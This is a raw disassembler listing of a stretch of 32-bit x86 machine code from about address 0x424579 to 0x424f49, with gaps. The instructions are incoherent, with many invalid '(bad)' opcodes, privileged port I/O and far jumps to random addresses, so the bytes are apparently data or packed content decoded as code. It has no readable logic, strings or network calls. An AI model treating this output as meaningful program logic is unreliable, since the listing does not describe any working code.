  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x7],1
  424581:	jae    0x4245f3
  424583:	pop    ebp
  424584:	cwde   
  424585:	add    DWORD PTR [ecx],0x0
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	jecxz  0x424532
  42458e:	mov    ebx,0xc52af17
  424593:	and    BYTE PTR [ebx+0x3fde9e66],bl
  424599:	lods   al,BYTE PTR ds:[esi]
  42459a:	aas    
  42459b:	scas   eax,DWORD PTR es:[edi]
  42459c:	mov    ds:0xf842aca6,eax
  4245a1:	cmp    eax,0xe456295c
  4245a6:	sub    DWORD PTR [bx+si-0x2e],edx
  4245aa:	inc    ecx
  4245ab:	jno    0x42456d
  4245ad:	sub    ebx,DWORD PTR [ebx]
  4245af:	and    al,0x47
  4245b1:	leave  
  4245b2:	fnstenv [edx]
  4245b4:	loope  0x4245eb
  4245b6:	out    dx,eax
  4245b7:	call   0x4ca7d753
  4245bc:	pop    ebp
  4245bd:	or     BYTE PTR [eax-0x2c],dh
  4245c0:	test   BYTE PTR [ebp+0x516710c6],al
  4245c6:	cmc    
  4245c7:	jb     0x424607
  4245c9:	dec    ecx
  4245ca:	ins    BYTE PTR es:[edi],dx
  4245cb:	fucomip st,st(1)
  4245cd:	mov    ecx,0x4fec29c3
  4245d2:	jg     0x424595
  4245d4:	or     esi,ecx
  4245d6:	mov    bl,0x22
  4245d8:	adc    bl,ah
  4245da:	cmc    
  4245db:	mov    ebx,0xc59eb533
  4245e0:	cmp    DWORD PTR [esi],esi
  4245e2:	std    
  4245e3:	(bad)  
  4245e4:	in     eax,0xf6
  4245e6:	push   eax
  4245e7:	rcl    BYTE PTR ds:0x6cf5d62a,1
  4245ed:	xor    al,0xf5
  4245ef:	not    BYTE PTR [edi+eiz*1+0x339062b9]
  4245f6:	mov    ds:0x17a72778,al
  4245fb:	rol    DWORD PTR [eax-0x77],0x55
  4245ff:	clc    
  424600:	sub    DWORD PTR [ecx-0x36750815],edi
  424606:	popa   
  424607:	pop    edx
  424608:	adc    ebp,DWORD PTR [edx]
  42460a:	mov    WORD PTR [esi+0x4c259a55],ss
  424610:	cmp    eax,0x79f1719e
  424615:	rcr    BYTE PTR ds:0x38ef3aad,1
  42461b:	outs   dx,DWORD PTR ds:[esi]
  42461c:	nop
  42461d:	sbb    BYTE PTR [edi+0x763be3b8],bl
  424623:	pop    ebx
  424624:	xchg   edi,eax
  424625:	div    DWORD PTR [esi+0x42]
  424628:	aaa    
  424629:	into   
  42462a:	pop    ss
  42462b:	xor    al,0x1c
  42462d:	mov    ebp,0x4329befb
  424632:	into   
  424633:	pop    ebp
  424634:	push   eax
  424635:	mov    WORD PTR [edi+0x7755e3f8],ss
  42463b:	lods   al,BYTE PTR ds:[esi]
  42463c:	data16 arpl WORD PTR [ebp+0x46ee2b90],bx
  424643:	push   esp
  424644:	xchg   ecx,eax
  424645:	mov    edi,ss
  424647:	into   
  424648:	loopne 0x4245e6
  42464a:	mov    eax,0x64d5e22d
  42464f:	jns    0x4245ee
  424651:	int    0xfd
  424653:	or     edi,DWORD PTR ds:0xb5152389
  424659:	jp     0x424693
  42465b:	stos   DWORD PTR es:[edi],eax
  42465c:	mov    ah,0x30
  42465e:	fsubr  DWORD PTR [ebx+0x2d]
  424661:	push   ebp
  424662:	push   0xbaf09550
  424667:	xor    eax,0x812f73f
  42466c:	pop    ds
  42466d:	dec    eax
  42466e:	outs   dx,BYTE PTR ds:[esi]
  42466f:	push   ss
  424670:	aas    
  424671:	mov    bl,0xbf
  424673:	cmc    
  424674:	jg     0x424652
  424676:	inc    edi
  424677:	jbe    0x4246b0
  424679:	bound  ebx,QWORD PTR [edx+0x6c32e799]
  42467f:	fcomp  DWORD PTR [esi]
  424681:	pop    edx
  424682:	mov    edi,0xcd24a8b1
  424687:	xor    eax,DWORD PTR [esi]
  424689:	sbb    eax,0x8e7ffbea
  42468e:	add    al,0x8a
	...
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edx-0x633917fe],cl
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	and    DWORD PTR [esi],esp
  42470e:	das    
  42470f:	popa   
  424710:	call   0x296bb032
  424715:	aam    0x67
  424717:	ret    
  424718:	jo     0x424798
  42471a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42471b:	sub    al,0xab
  42471d:	push   0x96af33ea
  424722:	pop    ds
  424723:	sbb    eax,ebp
  424725:	pop    esi
  424726:	dec    ecx
  424727:	jecxz  0x42474c
  424729:	dec    eax
  42472a:	(bad)  
  42472b:	popa   
  42472c:	adc    eax,DWORD PTR [ebp+eiz*1-0x7e]
  424730:	std    
  424731:	ins    DWORD PTR es:[edi],dx
  424732:	loop   0x4246d1
  424734:	mov    ebx,DWORD PTR [eax+0x79]
  424737:	inc    eax
  424738:	or     dl,BYTE PTR [edx+ebp*2-0x1a3bf423]
  42473f:	es jl  0x424754
  424742:	mov    cl,0x6e
  424744:	ret    0xf426
  424747:	imul   ecx,ebp,0x8d91adbb
  42474d:	popf   
  42474e:	mov    bh,BYTE PTR [ecx]
  424750:	adc    al,0xbf
  424752:	clc    
  424753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424754:	jl     0x424706
  424756:	push   ds
  424757:	jae    0x42476b
  424759:	xchg   ebp,eax
  42475a:	pop    eax
  42475b:	mov    esi,0xca19a4a4
  424760:	jns    0x4247c9
  424762:	cmp    bl,cl
  424764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424765:	xchg   ah,ch
  424767:	test   BYTE PTR [edi+edi*8-0x48e35cbc],bl
  42476e:	mov    edi,DWORD PTR [edi]
  424770:	inc    edi
  424771:	lock mov BYTE PTR [eax-0x2697bf99],bl
  424778:	stos   DWORD PTR es:[edi],eax
  424779:	mov    BYTE PTR [esi],dh
  42477b:	jns    0x4247a6
  42477d:	shl    bl,1
  42477f:	dec    ecx
  424780:	and    eax,0x61e16460
  424785:	(bad)  
  424786:	loop   0x4247da
  424788:	mov    ecx,0x6f68af4a
  42478d:	jle    0x42471c
  42478f:	dec    edx
  424790:	test   eax,0xbbc28af7
  424795:	push   0x1d
  424797:	loop   0x42472b
  424799:	push   0xbaf2eed4
  42479e:	fsub   st(5),st
  4247a0:	nop
  4247a1:	cmp    ch,BYTE PTR [ecx+0x71027d64]
  4247a7:	ret    
  4247a8:	pop    esp
  4247a9:	mov    dh,0x7
  4247ab:	in     al,0x4d
  4247ad:	jl     0x4247ec
  4247af:	xchg   ecx,eax
  4247b0:	push   cs
  4247b1:	xchg   esi,eax
  4247b2:	cld    
  4247b3:	xchg   ecx,eax
  4247b4:	jmp    0x42481b
  4247b6:	clc    
  4247b7:	cmp    BYTE PTR [ebx+eax*4],cl
  4247ba:	adc    bh,bl
  4247bc:	loope  0x424756
  4247be:	mov    esi,DWORD PTR [ebp+0x51]
  4247c1:	cmc    
  4247c2:	pop    esp
  4247c3:	pop    ebx
  4247c4:	das    
  4247c5:	(bad)  
  4247c8:	cdq    
  4247c9:	sub    bh,dh
  4247cb:	lods   eax,DWORD PTR ds:[esi]
  4247cc:	pop    eax
  4247cd:	cdq    
  4247ce:	jl     0x4247ce
  4247d0:	xchg   ebx,eax
  4247d1:	push   edx
  4247d2:	daa    
  4247d3:	mov    ah,0x9b
  4247d5:	ror    DWORD PTR [ebp+ecx*8+0x50],cl
  4247d9:	hlt    
  4247da:	(bad)  
  4247db:	out    dx,eax
  4247dc:	inc    ecx
  4247dd:	mov    esp,0xb0553e0e
  4247e2:	mov    bh,0x5b
  4247e4:	or     dl,ch
  4247e6:	int3   
  4247e7:	mov    bl,0xd5
  4247e9:	inc    ebx
  4247ea:	addr16 pop ds
  4247ec:	inc    ebp
  4247ed:	jns    0x42478f
  4247ef:	cmp    BYTE PTR [ecx],dl
  4247f1:	pop    eax
  4247f2:	mov    al,ds:0xe37c2906
  4247f7:	imul   ecx,DWORD PTR [eax],0xffffffcf
  4247fa:	pop    ss
  4247fb:	mov    eax,ebp
  4247fd:	mov    ecx,0xc899908a
  424802:	and    al,0xa
  424804:	push   es
  424805:	pop    edi
  424806:	(bad)  
  424807:	fistp  WORD PTR [ecx+0x18]
  42480a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42480b:	or     DWORD PTR [edx],ecx
  42480d:	push   edi
  42480e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	fbstp  TBYTE PTR [eax-0x7a5fec46]
  424886:	add    DWORD PTR [eax],eax
  424888:	add    al,0x1
  42488a:	add    BYTE PTR [eax],al
  42488c:	or     BYTE PTR [esi],al
  42488e:	sub    eax,0xbabd3fb1
  424893:	hlt    
  424894:	adc    DWORD PTR [ecx],edi
  424896:	iret   
  424897:	outs   dx,DWORD PTR ds:[esi]
  424898:	dec    ebp
  424899:	jg     0x424881
  42489b:	(bad)  
  42489c:	jo     0x424893
  42489e:	retf   
  42489f:	test   DWORD PTR [ecx],ecx
  4248a1:	mov    cl,0x23
  4248a3:	mov    al,0x82
  4248a5:	push   edx
  4248a6:	test   al,0x8a
  4248a8:	in     eax,dx
  4248a9:	retf   0x2877
  4248ac:	push   cs
  4248ad:	repnz mov cl,0xdc
  4248b0:	xor    ebx,eax
  4248b2:	add    BYTE PTR [edx],dl
  4248b4:	add    eax,0xccbc421e
  4248b9:	cmc    
  4248ba:	lods   eax,DWORD PTR ds:[esi]
  4248bb:	xlat   BYTE PTR ds:[ebx]
  4248bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248bd:	inc    ebp
  4248be:	inc    ebx
  4248bf:	push   ebp
  4248c0:	call   0x4442:0x6bff4c75
  4248c7:	sbb    ecx,DWORD PTR [ebp+0x31d04ace]
  4248cd:	push   edi
  4248ce:	jmp    0x4248eb
  4248d0:	int3   
  4248d1:	dec    eax
  4248d2:	push   eax
  4248d3:	xor    bh,ah
  4248d5:	fsubr  DWORD PTR [edi]
  4248d7:	mov    ebp,0x2040fd6f
  4248dc:	retf   
  4248dd:	pop    edi
  4248de:	lahf   
  4248df:	cmc    
  4248e0:	sub    eax,0xf9d3fdc5
  4248e5:	jmp    0xce90ff6f
  4248ea:	cmc    
  4248eb:	retf   
  4248ec:	stc    
  4248ed:	pop    esi
  4248ee:	pushf  
  4248ef:	inc    eax
  4248f0:	and    eax,0xe182dfb8
  4248f5:	add    BYTE PTR ds:0x5c252c98,dl
  4248fb:	jne    0x424921
  4248fd:	in     al,0x5f
  4248ff:	mov    dh,BYTE PTR [ebx-0x70d897cb]
  424905:	mov    dl,0xfe
  424907:	fs jns 0x42494e
  42490a:	addr16 enter 0xe972,0x91
  42490f:	ins    DWORD PTR es:[edi],dx
  424910:	inc    esi
  424911:	or     DWORD PTR [ecx],0xffffffcc
  424914:	xchg   BYTE PTR [esi+0x2f25e33b],ah
  42491a:	test   al,0xa7
  42491c:	nop
  42491d:	jnp    0x4248d9
  42491f:	inc    edx
  424920:	jge    0x424958
  424922:	sar    DWORD PTR [esi-0x408a432c],1
  424928:	dec    esp
  424929:	mov    eax,ds:0xe323cd59
  42492e:	push   ebp
  42492f:	hlt    
  424930:	xchg   esp,eax
  424931:	dec    eax
  424932:	loopne 0x4248ed
  424934:	cli    
  424935:	or     al,0xa
  424937:	mov    dh,0x6e
  424939:	addr16 jns 0x424970
  42493c:	lock push ds
  42493e:	outs   dx,BYTE PTR ds:[esi]
  42493f:	inc    esi
  424940:	call   0x6da12067
  424945:	add    esi,DWORD PTR [edi+eax*8]
  424948:	and    ebx,DWORD PTR [ebp-0x21]
  42494b:	leave  
  42494c:	push   ds
  42494d:	scas   eax,DWORD PTR es:[edi]
  42494e:	mov    ebp,0x1ad82a8d
  424953:	mov    bh,0xf0
  424955:	or     DWORD PTR [ebx+eiz*1],ecx
  424958:	lods   al,BYTE PTR ds:[esi]
  424959:	mov    WORD PTR [esi],?
  42495b:	int3   
  42495c:	sub    esp,DWORD PTR [ebp+ebp*8+0x41]
  424960:	out    0xe0,eax
  424962:	inc    ebp
  424963:	mov    edx,0xb54e840f
  424968:	xchg   esp,eax
  424969:	(bad)  
  42496a:	fiadd  WORD PTR [ebp+0x5d990117]
  424970:	cdq    
  424971:	xor    ch,BYTE PTR [edi-0x66]
  424974:	inc    edi
  424975:	int3   
  424976:	je     0x42496e
  424978:	pusha  
  424979:	or     dl,dh
  42497b:	add    BYTE PTR [ecx-0x28da5c8e],cl
  424981:	loopne 0x4249a3
  424983:	loopne 0x424999
  424985:	push   es
  424986:	mov    al,0x4f
  424988:	stos   BYTE PTR es:[edi],al
  424989:	imul   edi,DWORD PTR [ebp+0x45],0x75
  42498d:	inc    eax
  42498e:	jbe    0x4249aa
	...
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,BYTE PTR [ecx]
  424a01:	mov    cl,0x24
  424a03:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	cmp    eax,0xbf5ee5e4
  424a11:	and    eax,0x348e5234
  424a16:	pop    esp
  424a18:	or     DWORD PTR [esi-0x42f156d0],esi
  424a1e:	out    dx,al
  424a1f:	cbw    
  424a21:	jnp    0x4249f4
  424a23:	ds retf 
  424a25:	mov    ds:0x7bda082b,eax
  424a2a:	and    al,BYTE PTR [ecx+0x29cf7a3b]
  424a30:	or     BYTE PTR [esi-0x7f],ah
  424a33:	dec    esi
  424a34:	repnz bound ebx,QWORD PTR [ecx]
  424a37:	adc    al,0x73
  424a39:	dec    eax
  424a3a:	js     0x424a22
  424a3c:	inc    esi
  424a3d:	pop    esi
  424a3e:	push   esp
  424a3f:	mov    al,0xc9
  424a41:	sub    ch,BYTE PTR [ebx]
  424a43:	or     eax,0x271b13d
  424a48:	sub    BYTE PTR [ecx],0x54
  424a4b:	ret    0x2dd8
  424a4e:	cmp    DWORD PTR [edx],eax
  424a50:	jns    0x4249eb
  424a52:	push   ecx
  424a53:	aas    
  424a54:	mov    ch,0xd1
  424a56:	jno    0x424a53
  424a58:	push   es
  424a59:	xlat   BYTE PTR ds:[ebx]
  424a5a:	jp     0x424a9b
  424a5c:	mov    cl,0x24
  424a5e:	sbb    esi,esp
  424a60:	fwait
  424a61:	inc    edx
  424a62:	pop    edx
  424a63:	dec    eax
  424a64:	mov    WORD PTR [ebx+ebp*4+0x46],gs
  424a68:	inc    DWORD PTR [ecx]
  424a6a:	xchg   esi,eax
  424a6b:	nop
  424a6c:	fidiv  WORD PTR es:[edx-0xdd12fbe]
  424a73:	popf   
  424a74:	xlat   BYTE PTR ds:[ebx]
  424a75:	push   esp
  424a76:	les    ebx,FWORD PTR [ebp+0x1dd8ff95]
  424a7c:	jle    0x424a61
  424a7e:	or     edx,DWORD PTR [edi+eiz*2]
  424a81:	outs   dx,BYTE PTR ds:[esi]
  424a82:	mov    edx,0xbec1be01
  424a87:	inc    ah
  424a89:	push   es
  424a8a:	popa   
  424a8b:	pop    ecx
  424a8c:	cmp    esi,DWORD PTR [esi-0x23]
  424a8f:	bound  edx,QWORD PTR [edi+0x67]
  424a92:	push   ebp
  424a93:	in     eax,dx
  424a94:	sbb    al,bl
  424a96:	cs ins DWORD PTR es:[edi],dx
  424a98:	dec    esp
  424a99:	add    esi,DWORD PTR [edi-0x7e1dbd20]
  424a9f:	sbb    DWORD PTR [edi+0x75aa3495],eax
  424aa5:	popa   
  424aa6:	or     eax,0xbaea51c9
  424aab:	imul   ebp,DWORD PTR [edx],0x13eec1ab
  424ab1:	push   eax
  424ab2:	pop    ebx
  424ab3:	xor    eax,0xb6707f97
  424ab8:	mov    BYTE PTR [eax-0x334a89ed],0x27
  424abf:	inc    ecx
  424ac0:	mov    ecx,0xbd79bbdb
  424ac5:	fisub  WORD PTR [eax]
  424ac7:	sub    eax,DWORD PTR [edi+0x19]
  424aca:	js     0x424a6d
  424acc:	fmul   st(6),st
  424ace:	dec    esi
  424acf:	jmp    0x219e:0xd8aab21a
  424ad6:	iret   
  424ad7:	jp     0x424b2b
  424ad9:	mov    WORD PTR [edx],?
  424adb:	fild   DWORD PTR [eax*4-0x22cf6b85]
  424ae2:	mov    esi,eax
  424ae4:	sbb    ebp,DWORD PTR [eax]
  424ae6:	outs   dx,DWORD PTR ds:[esi]
  424ae7:	cmp    edi,DWORD PTR [ecx+0x38]
  424aea:	jb     0x424b37
  424aec:	mov    ebp,0xdf277a88
  424af1:	pop    ebx
  424af2:	ss inc ebp
  424af4:	stos   DWORD PTR es:[edi],eax
  424af5:	xchg   edx,eax
  424af6:	in     eax,0xe2
  424af8:	sahf   
  424af9:	sub    ecx,DWORD PTR [edi-0x76e7f738]
  424aff:	jecxz  0x424af7
  424b01:	adc    dh,dh
  424b03:	icebp  
  424b04:	popf   
  424b05:	mov    DWORD PTR [ecx+ebx*4+0x53a0d2e6],ebp
  424b0c:	sub    DWORD PTR [edi],eax
  424b0e:	leave  
  424b0f:	push   esi
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b81:	pop    esp
  424b82:	lods   al,BYTE PTR ds:[esi]
  424b83:	(bad)  
  424b84:	test   al,0x87
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	push   0x43
  424b8e:	stc    
  424b8f:	aaa    
  424b90:	hlt    
  424b91:	ja     0x424b3f
  424b93:	push   esp
  424b94:	les    esi,FWORD PTR [ebp+0x703f0394]
  424b9a:	add    dl,BYTE PTR [edx+0x4f]
  424b9d:	dec    edx
  424b9e:	shr    DWORD PTR [ebp-0xe],0xc9
  424ba2:	push   eax
  424ba3:	(bad)  
  424ba4:	je     0x424bc8
  424ba6:	aaa    
  424ba7:	add    DWORD PTR [eax],ecx
  424ba9:	adc    al,0x80
  424bab:	adc    DWORD PTR [edi+0x64b5ba35],edi
  424bb1:	adc    al,0xb2
  424bb3:	ficomp DWORD PTR [ecx+0x18e82c46]
  424bb9:	dec    esp
  424bba:	jae    0x424bb5
  424bbc:	xchg   ebx,eax
  424bbd:	inc    esp
  424bbe:	sti    
  424bbf:	(bad)  
  424bc0:	retf   0x6b45
  424bc3:	js     0x424c2b
  424bc5:	popa   
  424bc6:	cmp    al,0xca
  424bc8:	addr16 das 
  424bca:	call   DWORD PTR [esi-0x51]
  424bcd:	inc    edi
  424bce:	mov    edx,0xb3a722d1
  424bd3:	mov    ds:0x7367cb27,eax
  424bd8:	bnd jne 0x424c57
  424bdb:	lods   al,BYTE PTR ds:[esi]
  424bdc:	pushf  
  424bdd:	and    edi,0xe
  424be0:	out    dx,al
  424be1:	mov    eax,0xb5d25811
  424be6:	aas    
  424be7:	mov    bh,0x1d
  424be9:	sbb    eax,0x91acbb48
  424bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bef:	test   DWORD PTR [eax+0x1490ea1e],0xf0913b1d
  424bf9:	shr    DWORD PTR [eax+0x4],1
  424bfc:	imul   BYTE PTR [eax]
  424bfe:	test   eax,0x406f649f
  424c03:	dec    ecx
  424c04:	add    ecx,DWORD PTR [edx]
  424c06:	or     DWORD PTR [eax],0xb4216bfa
  424c0c:	imul   esp,DWORD PTR [eax+ebp*4],0xffffff8e
  424c10:	je     0x424c1c
  424c12:	add    dl,BYTE PTR [ebx-0x15]
  424c15:	out    dx,al
  424c16:	push   es
  424c17:	in     al,0x1f
  424c19:	loope  0x424c1c
  424c1b:	jl     0x424bf5
  424c1d:	pop    edi
  424c1e:	xchg   esi,eax
  424c1f:	push   cs
  424c20:	stos   DWORD PTR es:[edi],eax
  424c21:	cmp    dh,BYTE PTR [ebx]
  424c23:	cmp    al,0x8f
  424c25:	leave  
  424c26:	enter  0xa09e,0x15
  424c2a:	lahf   
  424c2b:	mov    edi,0x57eea7d8
  424c30:	xchg   esi,eax
  424c31:	xchg   ecx,eax
  424c32:	sbb    ebx,edi
  424c34:	leave  
  424c35:	int    0xf9
  424c37:	add    eax,0x6a2d4f83
  424c3c:	sub    BYTE PTR [edx-0x6c16049c],al
  424c42:	xchg   esp,eax
  424c43:	mov    ah,0x86
  424c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c46:	sar    DWORD PTR [eax+0x52],0xd8
  424c4a:	es push esp
  424c4c:	cdq    
  424c4d:	xor    DWORD PTR [edi+0x51],esi
  424c50:	dec    esi
  424c51:	stc    
  424c52:	mov    dl,0xeb
  424c54:	sbb    esi,edi
  424c56:	(bad)  
  424c57:	lds    ebp,FWORD PTR [edi-0x21104119]
  424c5d:	jno    0x424be3
  424c5f:	outs   dx,BYTE PTR ds:[esi]
  424c60:	pop    esp
  424c61:	test   eax,0x16d6c649
  424c66:	dec    esp
  424c67:	retf   
  424c68:	ja     0x424ca9
  424c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c6b:	mov    bl,0x82
  424c6e:	inc    esp
  424c6f:	add    DWORD PTR [ebx+0x6c],edx
  424c72:	xchg   esp,eax
  424c73:	pop    es
  424c74:	pushf  
  424c75:	mov    eax,ds:0x934ed6ac
  424c7a:	xor    ebx,DWORD PTR [ecx+0x3291c17]
  424c80:	mov    edx,0xf9fd740b
  424c85:	test   DWORD PTR [ebx-0x72f57abd],ebp
  424c8b:	mov    dl,al
  424c8d:	jmp    0x0:0x5010
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x5490ae58]
  424d02:	mov    DWORD PTR [ecx+0x188ac],eax
  424d08:	add    al,0x1
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	lods   eax,DWORD PTR ds:[si]
  424d0e:	jno    0x424d53
  424d10:	repnz in al,0xdd
  424d13:	xchg   esi,eax
  424d14:	xchg   edi,eax
  424d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d16:	pop    eax
  424d17:	mov    ds:0x74918923,al
  424d1c:	jl     0x424cc1
  424d1e:	mov    edx,0xc2082d30
  424d23:	repz pop edi
  424d25:	or     dl,bh
  424d27:	rcr    BYTE PTR [esi-0x73],1
  424d2a:	mov    ch,BYTE PTR [ebx-0x59]
  424d2d:	out    dx,eax
  424d2e:	inc    eax
  424d2f:	and    eax,0xdd5f2dd0
  424d34:	jns    0x424cdf
  424d36:	cmp    edx,ecx
  424d38:	sar    edx,0xe1
  424d3b:	inc    esi
  424d3c:	push   ss
  424d3d:	jae    0x424d47
  424d3f:	push   cs
  424d40:	jmp    DWORD PTR [ebp+0x52]
  424d43:	outs   dx,DWORD PTR ds:[esi]
  424d44:	arpl   bx,bp
  424d46:	aad    0x7f
  424d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d49:	and    al,0xf0
  424d4b:	fwait
  424d4c:	jo     0x424d83
  424d4e:	cdq    
  424d4f:	xchg   esp,eax
  424d50:	repz jge 0x424d08
  424d53:	in     al,dx
  424d54:	mov    eax,ds:0x231bee2c
  424d59:	adc    DWORD PTR [edx+0x51a5d245],0x89c5423
  424d63:	add    BYTE PTR [ebp-0x3851f1cf],cl
  424d69:	aaa    
  424d6a:	push   edi
  424d6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d6c:	mov    edi,DWORD PTR [ebp+0x7aa2896c]
  424d72:	dec    edx
  424d73:	dec    eax
  424d74:	fadd   st,st(5)
  424d76:	rcr    BYTE PTR [edx-0x696a789b],0xdd
  424d7d:	jmp    0xe7d7:0xe02f5e1c
  424d84:	jns    0x424d99
  424d86:	rcr    BYTE PTR [edx+edx*4],1
  424d89:	imul   ebx,DWORD PTR [edx],0x5d21a303
  424d8f:	in     al,0x72
  424d91:	xchg   ebp,eax
  424d92:	jae    0x424dc0
  424d94:	jp     0x424df4
  424d96:	mov    ah,0x0
  424d98:	jmp    0xbfa74d2d
  424d9d:	push   eax
  424d9e:	loop   0x424d88
  424da0:	dec    edi
  424da1:	ds jle 0x424d75
  424da4:	mov    bl,0x27
  424da6:	iret   
  424da7:	leave  
  424da8:	cmp    dl,BYTE PTR [ebx]
  424daa:	cmc    
  424dab:	sbb    eax,0x8bf6fabb
  424db0:	es (bad) 
  424db2:	mov    edi,0x1309c066
  424db7:	lahf   
  424db8:	mov    al,ds:0x30ce8451
  424dbd:	jge    0x424daa
  424dbf:	jmp    0x5d6b4d63
  424dc4:	mov    BYTE PTR [edx+edx*4],al
  424dc7:	js     0x424e1e
  424dc9:	gs add ah,bh
  424dcc:	iret   
  424dcd:	cmc    
  424dce:	sar    BYTE PTR [esi-0x40f1633f],0xe7
  424dd5:	rcl    DWORD PTR cs:[ebx-0x64],1
  424dd9:	cmp    eax,DWORD PTR [edi]
  424ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ddc:	ret    
  424ddd:	out    0x1d,eax
  424ddf:	inc    ebx
  424de0:	mov    al,0x89
  424de2:	lock mov edi,0xdf43206d
  424de8:	fwait
  424de9:	jmp    0xed50:0x6b213312
  424df0:	fld    QWORD PTR [eax-0x3]
  424df3:	jne    0x424d9a
  424df5:	xor    BYTE PTR [ebx-0x3f],bh
  424df8:	daa    
  424df9:	shl    DWORD PTR [edx+0x3f45a03e],1
  424dff:	daa    
  424e00:	mov    DWORD PTR [ebp+0x7a9d145e],esi
  424e06:	test   DWORD PTR [esi+0x746e95b8],edx
  424e0c:	clc    
  424e0d:	xor    DWORD PTR [ecx],ebp
  424e0f:	loopne 0x424e11
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e26
  424e81:	shl    BYTE PTR [edi+ebx*2],1
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	sbb    edi,DWORD PTR [ecx-0x53c37dd7]
  424e92:	cwde   
  424e93:	inc    edx
  424e94:	sub    BYTE PTR [edx-0x42],dl
  424e97:	in     eax,dx
  424e98:	mov    DWORD PTR [edi+0x1189954c],ebx
  424e9e:	dec    ecx
  424e9f:	jge    0x424f13
  424ea1:	loope  0x424e87
  424ea3:	cld    
  424ea4:	xor    BYTE PTR [esi-0x1e],bh
  424ea7:	fdivr  QWORD PTR [ebx+eiz*2-0x365e9f9]
  424eae:	stos   DWORD PTR es:[edi],eax
  424eaf:	ins    DWORD PTR es:[edi],dx
  424eb0:	add    BYTE PTR [edx],0x8a
  424eb3:	sahf   
  424eb4:	data16 (bad) 
  424eb6:	outs   dx,DWORD PTR ds:[esi]
  424eb7:	and    DWORD PTR [eax-0x165fc69e],edi
  424ebd:	movhps QWORD PTR [ebx+eax*1+0x15],xmm2
  424ec2:	pop    es
  424ec3:	mov    cl,0x7b
  424ec5:	ins    BYTE PTR es:[edi],dx
  424ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ec7:	ret    0x80f6
  424eca:	daa    
  424ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ecc:	cwde   
  424ecd:	ret    0x191c
  424ed0:	ins    BYTE PTR es:[edi],dx
  424ed1:	or     DWORD PTR [esi+0x64],ebp
  424ed4:	dec    edx
  424ed5:	outs   dx,BYTE PTR ds:[esi]
  424ed6:	rcr    DWORD PTR [eax],0x94
  424ed9:	dec    edx
  424eda:	(bad)  
  424edb:	stos   DWORD PTR es:[edi],eax
  424edc:	imul   esp,DWORD PTR [esi],0xef1452cb
  424ee2:	mov    ecx,0x5e6f4d87
  424ee7:	mov    esp,0x7fc9ffab
  424eec:	pop    edi
  424eed:	pop    ds
  424eee:	imul   edi,DWORD PTR [edx],0xba4767d4
  424ef4:	sub    eax,DWORD PTR [esi+0x38a041a0]
  424efa:	mov    edx,0x72962d14
  424eff:	add    BYTE PTR [edx],bh
  424f01:	sbb    eax,0xd182a816
  424f06:	fidivr WORD PTR [ecx]
  424f08:	lahf   
  424f09:	mov    ah,0x79
  424f0b:	jmp    0xfe19d509
  424f10:	mov    ds:0x7500d299,al
  424f15:	inc    DWORD PTR [ecx+0x76]
  424f18:	shl    DWORD PTR [edx-0x31b68eec],1
  424f1e:	mov    esp,0x7b774778
  424f23:	ins    BYTE PTR es:[edi],dx
  424f24:	mov    bl,0x99
  424f26:	daa    
  424f27:	jnp    0x424f82
  424f29:	mov    bl,0x90
  424f2b:	inc    edi
  424f2c:	jnp    0x424f49
  424f2e:	sbb    edx,0xffffffa7
  424f31:	sar    BYTE PTR [esi],0x5
  424f34:	loopne 0x424ee3
  424f36:	leave  
  424f37:	jmp    0xe0f8:0x5bca0a84
  424f3e:	jmp    0xbd1:0xaff9652b
  424f45:	jl     0x424fae
  424f47:	dec    esp
  424f48:	cli    
  424f49:	retf   
